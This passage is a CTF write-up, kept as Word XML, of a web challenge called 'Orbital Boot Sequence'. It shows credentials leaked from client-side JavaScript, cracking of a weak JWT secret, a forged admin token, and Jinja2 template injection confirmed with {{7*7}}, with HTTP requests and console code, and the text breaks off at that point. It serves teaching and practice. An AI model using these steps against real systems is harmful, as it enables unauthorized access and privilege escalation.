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Boot Sequence - CTF Writeup</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Challenge:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The Orbital Boot Sequence has stalled mid-launch. Can you restart the relay and seize control before the fleet drifts off-course? Submit the root flag for the win.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Target:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://15.206.47.5:8443/</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Category:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Web Exploitation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Attack Flow</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="432"/>
        <w:jc w:val="center"/>
      </w:pPr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┌─────────────────────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│ 1. Reconnaissance                                            │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Examine JavaScript files (secrets.js)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2. Information Disclosure                                    │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Extract credentials from secrets.js                  │</w:t>
        <w:br/>
        <w:t>│        Username: flightoperator                              │</w:t>
        <w:br/>
        <w:t>│        Password: GlowCloud!93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3. Initial Access                                           │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Login with credentials → Receive operator JWT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4. JWT Analysis &amp; Secret Cracking                           │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Decode JWT → Crack secret ("butterfly")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5. Privilege Escalation                                     │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Forge admin JWT token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6. SSTI Discovery                                           │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Test {{7*7}} → Confirmed Jinja2 SSTI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7. RCE via SSTI                                             │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Access __globals__ → Use open() to read files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8. Flag Extraction                                          │</w:t>
        <w:br/>
        <w:t>│    └─&gt; Read /root/flag.txt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Initial Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Upon accessing the target URL, we're presented with a login page for the "Orbital Boot Sequence" relay system.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: Initial Login Page - ./initial-page.png]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The page contains several JavaScript files that are loaded:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`/static/js/telemetry.js`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`/static/js/hud.js`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`/static/js/secrets.js`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`/static/js/login.js`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Let's examine these files, particularly </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>secrets.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which sounds promising.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1: Finding Hardcoded Credentials</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Examining the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>secrets.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file reveals critical information. We can view this file directly in the browser's Network tab or by accessing it via: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GET /static/js/secrets.js HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 15.206.47.5:8443</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>(function () {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const dustyArchives = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      sector: "LUNA-IX",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      checksum: "f831d4d00c",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      fallback: "nebula",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      sector: "ORION-LOCK",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      checksum: "92acdd12a9",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      fallback: "solstice",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      sector: "CRADLE-PRIME",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      checksum: "bb92f0021",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      fallback: "midnight",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  const maintenanceScripts = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    reboot: [</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "echo \"Cycling arrays\"",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "sleep 1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "echo \"Arrays cycled\"",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ],</w:t>
        <w:br/>
        <w:t xml:space="preserve">    fallback: "echo \"Manual override required\"",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  };</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  const operatorLedger = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      codename: "relay-spider",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      username: "flightoperator",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      password: "GlowCloud!93",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      privilege: "operator",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      codename: "drift-marauder",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      username: "ghost",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      password: "aLongTimeAgo",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      privilege: "revoked",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      codename: "orbital-miner",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      username: "vector",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      password: "approximation",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      privilege: "revoked",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ];</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  window.__ORBIT_AUTH = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dustyArchives,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    maintenanceScripts,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    operatorLedger,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    getPrimary() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      return operatorLedger[0];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  };</w:t>
        <w:br/>
        <w:t>})();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Key Finding:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>operatorLedger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> array contains hardcoded credentials! The first operator has </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>privilege: "operator"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and active credentials:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Username:** `flightoperator`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Password:** `GlowCloud!93`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>**Note:** This is a classic example of **information disclosure** - sensitive credentials should never be stored in client-side JavaScript files, as anyone can view the source code.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2: Initial Authentication</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Using the discovered credentials, we authenticate via the login API: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POST /api/login HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 15.206.47.5:8443</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"username":"flightoperator","password":"GlowCloud!93"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "profile": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "displayName": "Relay Operator Iris",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "role": "operator",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "flightoperator"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmbGlnaHRvcGVyYXRvciIsInJvbGUiOiJvcGVyYXRvciIsImlhdCI6MTc2NTY4NDg4MiwiZXhwIjoxNzY1Njg2MDgyfQ.AZ-xsqLSXYoX-UIl6Z4t6OJitwLeebjKmpeqWT1KO_0"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The login process is handled by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>login.js</w:t>
      </w:r>
      <w:r>
        <w:t>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async function login(body) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const res = await fetch("/api/login", {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    method: "POST",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    headers: { "Content-Type": "application/json" },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    body: JSON.stringify(body),</w:t>
        <w:br/>
        <w:t xml:space="preserve">  });</w:t>
        <w:br/>
        <w:t xml:space="preserve">  if (!res.ok) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const err = await res.json().catch(() =&gt; ({ error: "Login failed" }));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    throw new Error(err.error || "Login failed");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  return res.json();</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>loginForm.addEventListener("submit", async (event) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  event.preventDefault();</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const formData = new FormData(loginForm);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const username = formData.get("username");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const password = formData.get("password");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const response = await login({ username, password });</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sessionStorage.setItem("orbitalToken", response.token);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sessionStorage.setItem("orbitalProfile", JSON.stringify(response.profile));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Redirects to /console</w:t>
        <w:br/>
        <w:t xml:space="preserve">    setTimeout(() =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      window.location.href = "/console";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }, 800);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  } catch (error) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Handle error</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">We receive a JWT token and are redirected to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/console</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. However, we notice that our role is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>"operator"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>"admin"</w:t>
      </w:r>
      <w:r>
        <w:t>. The console page shows an "Admin Beacon" button that is disabled for non-admin users.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3: JWT Token Analysis and Secret Cracking</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Let's decode the JWT token to understand its structure:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Header:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "alg": "HS256",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "typ": "JWT"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Payload:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "sub": "flightoperator",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "role": "operator",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "iat": 1765684882,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "exp": 1765686082</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The token uses HS256 (HMAC-SHA256), which means we need the secret key to forge tokens. Let's attempt to crack the JWT secret.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Using tools like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hashcat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>jwt-crack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, we discover the secret: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&lt;code&gt;butterfly&lt;/code&gt;</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: JWT Secret Cracking - jwt-cracked.png]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4: Forging Admin JWT Token</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Now that we have the secret, we can forge a new JWT token with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>role: "admin"</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>New Payload:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "sub": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "role": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "iat": 1765684882,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "exp": 1765686082</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Using the secret </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>butterfly</w:t>
      </w:r>
      <w:r>
        <w:t>, we generate a new admin token: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eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2NTY4NjAxMiwiZXhwIjoxNzY1Njg5MDgyfQ.GjcDvY5x1ujAOk-CGZDgpJzj9n4G-o3o6YrgszHD1io</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: JWT Token Tampering - jwt-tampered.png]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">We update the token in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sessionStorage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and refresh the page. The Admin Beacon panel is now accessible!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: Admin Token - ./admin-panel.png]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5: Understanding the Admin Beacon</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>The Admin Beacon form requires two inputs:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Instruction template</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - A textarea for the message</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Checksum signature</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - A checksum that must match the message</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Looking at the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>console.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file, we find the checksum calculation function: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function computeChecksum(payload, token) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  const buffer = `${payload || ""}::${token || "guest-orbital"}`;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  let acc = 0x9e3779b1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  for (let i = 0; i &lt; buffer.length; i += 1) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const code = buffer.charCodeAt(i);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const shift = i % 5;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    acc ^= (code &lt;&lt; shift) + (code &lt;&lt; 12);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    acc = (acc + ((acc &lt;&lt; 7) &gt;&gt;&gt; 0)) ^ (acc &gt;&gt;&gt; 3);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    acc = acc &gt;&gt;&gt; 0;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    acc ^= (acc &lt;&lt; 11) &amp; 0xffffffff;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    acc = acc &gt;&gt;&gt; 0;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  return (acc &gt;&gt;&gt; 0).toString(16).padStart(8, "0");</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>window.hyperpulseChecksum = computeChecksum;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The function is exposed globally as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>window.hyperpulseChecksum</w:t>
      </w:r>
      <w:r>
        <w:t>, making it easy to calculate checksums in the browser console.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The form submits to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/api/admin/hyperpulse</w:t>
      </w:r>
      <w:r>
        <w:t>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const res = await fetch("/api/admin/hyperpulse", {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  method: "POST",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  headers: {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "Content-Type": "application/json",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Authorization: `Bearer ${sessionToken}`,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  body: JSON.stringify({ message, checksum }),</w:t>
        <w:br/>
        <w:t>});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6: Discovering Server-Side Template Injection (SSTI)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">The form mentions "Instruction template", which suggests template rendering. This is a red flag for potential </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Server-Side Template Injection (SSTI)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Let's test for template injection by attempting to execute a simple mathematical expression. First, we calculate the checksum for a test payload using the browser console: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// In browser console on /console page</w:t>
        <w:br/>
        <w:t>const token = sessionStorage.getItem("orbitalToken");</w:t>
        <w:br/>
        <w:t>const message = "{{7*7}}";</w:t>
        <w:br/>
        <w:t>const checksum = window.hyperpulseChecksum(message, token);</w:t>
        <w:br/>
        <w:t>console.log("Checksum:", checksum); // Output: 7f2169b6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="808080"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Image: Checksum Generation - checksum-gen.png]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Calculating the checksum for our SSTI test payload*</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Submitting the payload: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POST /api/admin/hyperpulse HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 15.206.47.5:8443</w:t>
        <w:br/>
        <w:t>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"message":"{{7*7}}","checksum":"7f2169b6"}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "reference": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "now": "2025-12-14T04:26:54.478416",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "pilot": "Nova-17",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "systems": ["Life Support", "Payload Bay", "Thermal Shields"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "result": "49"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Success!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The template </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{{7*7}}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was evaluated and returned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>49</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, confirming </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
